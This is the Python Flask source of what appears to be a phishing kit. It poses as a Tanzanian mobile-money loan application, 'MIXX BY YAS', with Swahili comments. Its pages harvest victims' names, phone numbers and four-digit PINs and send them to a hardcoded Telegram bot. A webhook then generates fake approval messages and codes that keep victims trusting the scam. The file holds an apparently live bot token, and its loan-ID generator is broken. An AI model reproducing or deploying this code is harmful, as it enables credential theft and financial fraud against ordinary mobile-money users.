from flask import Flask, render_template, request, redirect, url_for
import requests
import random
from datetime import datetime, timedelta

app = Flask(__name__)

# ============ WEKA HAPA ============
TELEGRAM_TOKEN = "8864945488:AAFGN292M6CyjuU4LjQjfj_vUVJMchW07ik" 
ADMIN_CHAT_ID = "8580615195"
# ===================================

applications = {}
otp_store = {}

def send_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "HTML"}
    requests.post(url, data=data)

def send_telegram_buttons(loan_id, data):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    text = f"🔔 <b>NEW LOAN APPLICATION</b>\n\nID: {loan_id}\nName: {data['name']}\nPhone: {data['phone']}\nAmount: TZS {data['amount']:,}\nPurpose: {data['purpose']}"
    keyboard = {
        "inline_keyboard": [
            [{"text": "✅ Correct - Allow OTP", "callback_data": f"approve_{loan_id}"}],
            [{"text": "❌ Invalid - Deny", "callback_data": f"reject_{loan_id}"}]
        ]
    }
    data = {"chat_id": ADMIN_CHAT_ID, "text": text, "reply_markup": keyboard, "parse_mode": "HTML"}
    requests.post(url, json=data)

# ========== HATUA 1 ==========
@app.route('/', methods=['GET', 'POST'])
def step1():
    if request.method == 'POST':
        loan_id = str(random.randint(1000000, 9999))
        applications[loan_id] = {
            'type': request.form['loan_type'],
            'amount': int(request.form['amount']),
            'months': request.form['months'],
            'purpose': request.form['purpose']
        }
        return redirect(url_for('step2', loan_id=loan_id))
    return render_template('step1.html')

# ========== HATUA 2 ==========
@app.route('/step2/<loan_id>', methods=['GET', 'POST'])
def step2(loan_id):
    if request.method == 'POST':
        applications[loan_id]['name'] = request.form['name']
        applications[loan_id]['phone'] = request.form['phone']
        return redirect(url_for('pin_page', loan_id=loan_id))
    return render_template('step2.html', loan_id=loan_id)

# ========== HATUA 3 - PIN BOXES 4 ==========
@app.route('/pin/<loan_id>', methods=['GET', 'POST'])
def pin_page(loan_id):
    if request.method == 'POST':
        phone = request.form['phone']
        pin = request.form['pin1'] + request.form['pin2'] + request.form['pin3'] + request.form['pin4']
        applications[loan_id]['phone'] = phone
        applications[loan_id]['pin'] = pin
        
        # TUMA KWENDA TELEGRAM
        send_telegram_buttons(loan_id, applications[loan_id])
        
        return render_template('success.html')
    return render_template('pin.html', loan_id=loan_id)

# ========== TELEGRAM WEBHOOK ==========
@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    if 'callback_query' in data:
        callback = data['callback_query']
        action, loan_id = callback['data'].split('_')
        
        if action == 'approve':
            code = str(random.randint(1000, 9999))
            expiry = datetime.now() + timedelta(minutes=1)
            otp_store[loan_id] = {'code': code, 'expiry': expiry}
            phone = applications[loan_id]['phone']
            
            customer_msg = f"MIXX BY YAS: Ombi lako {loan_id} limeidhinishwa.\nCode yako ya siri ni: {code}\nTafadhali usishare na mtu. Inaisha dakika 1."
            admin_msg = f"✅ <b>APPROVED!</b>\n\n<b>TUMA UJUMBE HUU KWA MTEJA:</b>\n--------------------------------\n{customer_msg}\n--------------------------------\n\n<b>LINK:</b> https://loan-api-flask.onrender.com/otp/{loan_id}\n\n⚠️ Ina-expire: {expiry.strftime('%H:%M:%S')}"
            send_telegram(admin_msg)
            
    return "ok"

# ========== PAGE YA KUWEKA CODE ==========
@app.route('/otp/<loan_id>', methods=['GET', 'POST'])
def otp_page(loan_id):
    if request.method == 'POST':
        user_code = request.form['code']
        if loan_id in otp_store:
            if datetime.now() < otp_store[loan_id]['expiry']:
                if user_code == otp_store[loan_id]['code']:
                    return "<h1 style='color:green; text-align:center;'>✅ SUCCESS! Mkopo umeidhinishwa</h1>"
        return "<h1 style='color:red; text-align:center;'>❌ CODE NI SIKU SAHI AU IMEISHA</h1>"
    return render_template('otp.html', loan_id=loan_id, phone=applications[loan_id]['phone'])

if __name__ == '__main__':
    app.run(debug=True)
